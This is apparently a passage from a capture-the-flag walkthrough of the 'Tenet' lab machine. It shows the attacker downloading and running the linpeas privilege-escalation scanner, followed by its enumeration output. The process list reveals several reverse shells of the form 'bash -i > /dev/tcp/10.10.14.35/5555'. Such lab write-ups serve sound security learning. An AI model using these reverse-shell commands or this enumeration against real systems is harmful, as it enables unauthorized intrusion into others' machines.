10.129.71.67 - - [17/Feb/2021 14:00:15] "GET /linpeas.sh HTTP/1.1" 200 -

```
As you can see the file is downloaded on Tenet
```
wget 10.10.14.35:8080/linpeas.sh
ls
index.html
linpeas.sh
rce.php
sator.php
sator.php.bak
users.txt
wordpress

```
Linpeas is privesc scanner, so pls do execute:
```
./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.0.4 by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 Starting linpeas. Caching Writable Folders...

====================================( Basic information )=====================================
OS: Linux version 4.15.0-129-generic (buildd@lcy01-amd64-017) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #132-Ubuntu SMP Thu Dec 10 14:02:26 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: tenet
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories using 2 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-129-generic (buildd@lcy01-amd64-017) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #132-Ubuntu SMP Thu Dec 10 14:02:26 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Date
Wed Feb 17 19:07:12 UTC 2021

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2        23G  3.4G   19G  16% /
udev            1.9G     0  1.9G   0% /dev
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           395M  1.1M  394M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/loop0       87M   87M     0 100% /snap/core/4917
/dev/loop1       98M   98M     0 100% /snap/core/10444
              total        used        free      shared  buff/cache   available
Mem:        4039664      373912     2953092       22356      712660     3381928
Swap:       2096124           0     2096124

[+] CPU info
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              2
On-line CPU(s) list: 0,1
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           2
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          23
Model:               49
Model name:          AMD EPYC 7302P 16-Core Processor
Stepping:            0
CPU MHz:             2994.375
BogoMIPS:            5988.75
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            512K
L3 cache:            131072K
NUMA node0 CPU(s):   0,1
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor

[+] Environment
[i] Any private information inside environment variables?
HISTFILESIZE=0
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20777
_=-al
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=88827d44c8054724bf7f2838299537c1
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
 Not Found

[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)
[+] Is this a container? ........... No
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
UUID=a25f60d8-3935-11eb-bcc4-ab6b2d337a6c / ext4 defaults 0 0
/dev/sda3	none	swap	sw	0	0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/usr/bin/lxc

[+] Installed Compiler
/usr/share/gcc-8


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root         1  0.0  0.2 225380  9188 ?        Ss   13:38   0:02 /sbin/init maybe-ubiquity
root       694  0.0  0.3  78784 13432 ?        S<s  13:39   0:00 /lib/systemd/systemd-journald
root       712  0.0  0.1  45580  4384 ?        Ss   13:39   0:00 /lib/systemd/systemd-udevd
root       713  0.0  0.0  97716  1732 ?        Ss   13:39   0:00 /sbin/lvmetad -f
systemd+   872  0.0  0.0 141964  3312 ?        Ssl  13:39   0:01 /lib/systemd/systemd-timesyncd
    |--(Caps) 0x0000000002000000=cap_sys_time
root       971  0.0  0.2  89872 10748 ?        Ss   13:39   0:00 /usr/bin/VGAuthService
root       973  0.0  0.1 225736  7264 ?        S<sl 13:39   0:17 /usr/bin/vmtoolsd
systemd+  1114  0.0  0.1  71896  5296 ?        Ss   13:39   0:00 /lib/systemd/systemd-networkd
    |--(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+  1215  0.0  0.1  70928  6408 ?        Ss   13:39   0:01 /lib/systemd/systemd-resolved
root      1246  0.0  0.0  25992  3388 ?        Ss   13:39   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root      1362  0.0  0.1  62060  5696 ?        Ss   13:39   0:00 /lib/systemd/systemd-logind
daemon[0m    1363  0.0  0.0  28340  2520 ?        Ss   13:39   0:00 /usr/sbin/atd -f
root      1364  0.0  0.0  30036  3168 ?        Ss   13:39   0:00 /usr/sbin/cron -f
root      1367  0.0  0.0 110556  2076 ?        Ssl  13:39   0:00 /usr/sbin/irqbalance --foreground
root      1370  0.0  0.1 288656  7112 ?        Ssl  13:39   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog    1375  0.0  0.1 267276  5008 ?        Ssl  13:39   0:00 /usr/sbin/rsyslogd -n
root      1425  0.0  0.4 169104 17148 ?        Ssl  13:39   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1451  0.0  0.7 785632 29360 ?        Ssl  13:39   0:01 /usr/lib/snapd/snapd
message+  1452  0.0  0.1  50064  4520 ?        Ss   13:39   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    |--(Caps) 0x0000000020000000=cap_audit_write
root      1497  0.0  0.0 309452  2292 ?        Ssl  13:39   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1514  0.0  0.1  72308  6348 ?        Ss   13:39   0:00 /usr/sbin/sshd -D
root      1596  0.0  0.1 288888  6600 ?        Ssl  13:39   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1617  0.0  0.0  14896  1984 tty1     Ss+  13:39   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1692  0.0  0.4 335820 17488 ?        Ss   13:39   0:00 /usr/sbin/apache2 -k start
www-data  1732  0.0  0.8 342104 34856 ?        S    13:39   0:02  _ /usr/sbin/apache2 -k start
www-data  2168  0.0  0.8 342000 36268 ?        S    13:51   0:02  _ /usr/sbin/apache2 -k start
www-data  2185  0.0  0.8 342128 34960 ?        S    13:52   0:02  _ /usr/sbin/apache2 -k start
www-data  2197  0.0  0.8 342112 35132 ?        S    13:52   0:02  _ /usr/sbin/apache2 -k start
www-data  2198  0.0  0.8 341964 34672 ?        S    13:52   0:02  _ /usr/sbin/apache2 -k start
www-data  2200  0.0  0.8 342096 35144 ?        S    13:52   0:02  _ /usr/sbin/apache2 -k start
www-data  4492  0.0  0.0   4636   784 ?        S    18:48   0:00  |   _ sh -c /bin/bash -c 'bash -i > /dev/tcp/10.10.14.35/5555 0>&1'
www-data  4493  0.0  0.0  18384  3012 ?        S    18:48   0:00  |       _ /bin/bash -c bash -i > /dev/tcp/10.10.14.35/5555 0>&1
www-data  4494  0.0  0.0  18516  3372 ?        S    18:48   0:00  |           _ bash -i
www-data  3147  0.0  0.8 343836 35888 ?        S    15:56   0:01  _ /usr/sbin/apache2 -k start
www-data  4487  0.0  0.0   4636   928 ?        S    18:48   0:00  |   _ sh -c /bin/bash -c 'bash -i > /dev/tcp/10.10.14.35/5555 0>&1'
www-data  4488  0.0  0.0  18384  3120 ?        S    18:48   0:00  |       _ /bin/bash -c bash -i > /dev/tcp/10.10.14.35/5555 0>&1
www-data  4489  0.0  0.0  18516  3420 ?        S    18:48   0:00  |           _ bash -i
www-data  3148  0.0  0.8 341740 34944 ?        S    15:56   0:01  _ /usr/sbin/apache2 -k start
www-data  4584  0.0  0.0   4636   852 ?        S    18:57   0:00  |   _ sh -c /bin/bash -c 'bash -i > /dev/tcp/10.10.14.35/5555 0>&1'
www-data  4585  0.0  0.0  18384  3064 ?        S    18:57   0:00  |       _ /bin/bash -c bash -i > /dev/tcp/10.10.14.35/5555 0>&1
www-data  4586  0.0  0.0  18516  3504 ?        S    18:57   0:00  |           _ bash -i
www-data  4590  0.0  0.0   4636  1752 ?        S    18:57   0:00  |               _ /bin/sh -i
www-data  4644  0.1  0.0   4972  2108 ?        S    19:07   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  5335  0.0  0.0   4972   452 ?        S    19:07   0:00  |                       _ /bin/sh ./linpeas.sh
    |--(Caps) 0x0000000000000000=
www-data  5339  0.0  0.0  37020  3540 ?        R    19:07   0:00  |                       |   _ ps fauxwww
    |--(Caps) 0x0000000000000000=
www-data  5338  0.0  0.0   4972   452 ?        S    19:07   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  3149  0.0  0.8 341516 34300 ?        S    15:56   0:01  _ /usr/sbin/apache2 -k start
www-data  3388  0.0  0.8 341240 33600 ?        S    16:27   0:00  _ /usr/sbin/apache2 -k start
www-data  4497  0.0  0.0   4636   856 ?        S    18:49   0:00  |   _ sh -c /bin/bash -c 'bash -i > /dev/tcp/10.10.14.35/5555 0>&1'
www-data  4498  0.0  0.0  18384  3152 ?        S    18:49   0:00  |       _ /bin/bash -c bash -i > /dev/tcp/10.10.14.35/5555 0>&1
www-data  4499  0.0  0.0  18516  3512 ?        S    18:49   0:00  |           _ bash -i
www-data  4561  0.0  0.0   4636   820 ?        S    18:55   0:00  |               _ /bin/sh -i
www-data  4562  0.0  0.0  13460  1180 ?        S    18:55   0:00  |                   _ ping 10.10.14.35
www-data  4572  0.0  0.2 340220  9348 ?        S    18:56   0:00  _ /usr/sbin/apache2 -k start
www-data  4576  0.0  0.2 340220  9348 ?        S    18:56   0:00  _ /usr/sbin/apache2 -k start
www-data  4583  0.0  0.2 340220  9348 ?        S    18:57   0:00  _ /usr/sbin/apache2 -k start
mysql     1720  0.0  4.8 1621324 195292 ?      Sl   13:39   0:12 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root root  1113504 Jun  6  2019 /bin/bash
lrwxrwxrwx 1 root root        4 Jul 25  2018 /bin/sh -> dash
-rwxr-xr-x 1 root root   129096 Oct  7 20:30 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   219272 Oct  7 20:30 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  1637456 Oct  7 20:30 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   378944 Oct  7 20:30 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    38976 Oct  7 20:30 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   584136 Oct  7 20:30 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    56552 Sep 16 18:43 /sbin/agetty
-rwxr-xr-x 1 root root   500144 May  6  2019 /sbin/dhclient
lrwxrwxrwx 1 root root       20 Oct  7 20:30 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root    84104 Jan 23  2020 /sbin/lvmetad
-rwxr-xr-x 1 root root   129248 Mar 25  2020 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   236584 Jun 11  2020 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root root    18504 Mar 31  2020 /usr/bin/lxcfs
lrwxrwxrwx 1 root root        9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root root    55552 Mar 25  2020 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   182552 Nov  2 17:05 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 22654312 Nov 19 16:51 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   671392 Aug 12  2020 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root    64184 Jan  9  2019 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root 24703688 Oct 23 10:48 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Dec 16 11:20 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jun 26  2018 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  190 Jul 25  2018 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Jan  7 09:58 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jun 26  2018 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Jun 27  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jul 25  2018 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jul 25  2018 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jan  7 09:58 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Jun 27  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Incron
[+] Services
[i] Search for outdated versions
 [ - ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  mysql
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  uuidd
 [ - ]  vsftpd
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2021-02-17 19:09:00 UTC  1min 27s left Wed 2021-02-17 18:39:05 UTC  28min ago    phpsessionclean.timer        phpsessionclean.service
Wed 2021-02-17 21:19:25 UTC  2h 11min left Wed 2021-02-17 13:39:15 UTC  5h 28min ago motd-news.timer              motd-news.service
Thu 2021-02-18 01:57:18 UTC  6h left       Wed 2021-02-17 13:39:15 UTC  5h 28min ago apt-daily.timer              apt-daily.service
Thu 2021-02-18 06:31:09 UTC  11h left      Wed 2021-02-17 13:39:15 UTC  5h 28min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2021-02-18 13:53:35 UTC  18h left      Wed 2021-02-17 13:53:35 UTC  5h 13min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2021-02-22 00:00:00 UTC  4 days left   Wed 2021-02-17 13:39:15 UTC  5h 28min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                1215 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
:1.1                                1114 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
:1.182                              7046 busctl          www-data         :1.182        apache2.service           -          -                  
:1.2                                1362 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.27                               1596 polkitd         root             :1.27         polkit.service            -          -                  
:1.28                               1425 networkd-dispat root             :1.28         networkd-dispatcher.se…ce -          -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.5                                1370 accounts-daemon root             :1.5          accounts-daemon.service   -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts            1370 accounts-daemon root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1596 polkitd         root             :1.27         polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1              1362 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1            1114 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
org.freedesktop.resolve1            1215 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
tenet
127.0.0.1	localhost.localdomain	localhost
::1		localhost6.localdomain6	localhost6
127.0.0.1	tenet.htb
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

nameserver 127.0.0.53
options edns0

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.71.67  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb9:2f99  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:2f99  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:2f:99  txqueuelen 1000  (Ethernet)
        RX packets 117511  bytes 19883730 (19.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 88287  bytes 39175722 (39.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 22440  bytes 1772446 (1.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22440  bytes 1772446 (1.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[+] Networks and neighbours
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.129.0.1      0.0.0.0         UG    0      0        0 ens160
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens160
Address                  HWtype  HWaddress           Flags Mask            Iface
10.129.0.1               ether   00:50:56:b9:16:79   C                     ens160

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.129.71.67:27894      10.10.14.35:5555        ESTABLISHED 4494/bash           
tcp        0      0 10.129.71.67:27882      10.10.14.35:5555        ESTABLISHED 4489/bash           
tcp        0    203 10.129.71.67:28004      10.10.14.35:5555        ESTABLISHED 4586/bash           
tcp        0      1 10.129.71.67:28882      8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       1      0 10.129.71.67:80         10.10.14.35:36550       CLOSE_WAIT  -                   
tcp6       1      0 10.129.71.67:80         10.10.14.35:36544       CLOSE_WAIT  -                   
tcp6       0      0 10.129.71.67:80         10.10.14.35:36622       ESTABLISHED -                   
